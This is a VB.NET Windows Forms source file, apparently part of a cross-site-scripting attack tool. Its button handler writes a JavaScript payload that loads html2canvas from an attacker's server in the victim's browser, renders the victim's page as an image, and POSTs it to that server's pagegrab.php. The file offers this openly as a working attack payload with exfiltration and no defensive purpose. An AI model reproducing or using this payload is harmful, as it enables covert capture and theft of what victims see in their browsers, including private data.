Public Class xss_screenshot_page

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("page.png")
        Me.Close()
    End Sub
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        On Error Resume Next
        Timer1.Enabled = True
        Dim ran = New Random()
        Dim tmp = ran.Next(1000, 2000)

        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js", append:=True)
        stream.WriteLine("if (document.getElementById('getpgXEN" & Str(tmp) & "') == null) ")
        stream.WriteLine("{ function grab() { html2canvas(document.body, { onrendered: function(canvas) { ")
        stream.WriteLine("var dat = canvas.toDataURL('image/png'); var xmlhttp=new XMLHttpRequest(); ")
        stream.WriteLine("xmlhttp.open('POST', 'http://" & xss_server.server_ip & "/pagegrab.php', true);")
        stream.WriteLine("xmlhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); var x=encodeURIComponent(dat);")
        stream.WriteLine("xmlhttp.send('data=' + x); } }); } var scx= document.createElement('script');")
        stream.WriteLine("scx.type= 'text/javascript'; scx.onload= grab; scx.src= 'http://" & xss_server.server_ip & "/html2canvas.js';")
        stream.WriteLine("scx.id='getpgXEN" & Str(tmp) & "'; document.body.appendChild(scx); }")
        stream.Close()
     
    End Sub
    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            WebBrowser1.Navigate(Application.StartupPath & "\pagegrab.html")
        Catch

        End Try
    End Sub
    Private Sub WebBrowser1_DocumentCompleted(sender As Object, e As WebBrowserDocumentCompletedEventArgs) Handles WebBrowser1.DocumentCompleted

    End Sub

    Private Sub xss_screenshot_page_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("page.png")

    End Sub

    Private Sub xss_screenshot_page_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing

    End Sub

    Private Sub xss_screenshot_page_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next
        WebBrowser1.Width = Me.Width - 10
        WebBrowser1.Height = Me.Height - 35
        IO.File.Delete("page.png")
    End Sub

    Private Sub xss_screenshot_page_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        On Error Resume Next
        WebBrowser1.Width = Me.Width - 10
        WebBrowser1.Height = Me.Height - 35
    End Sub
End Class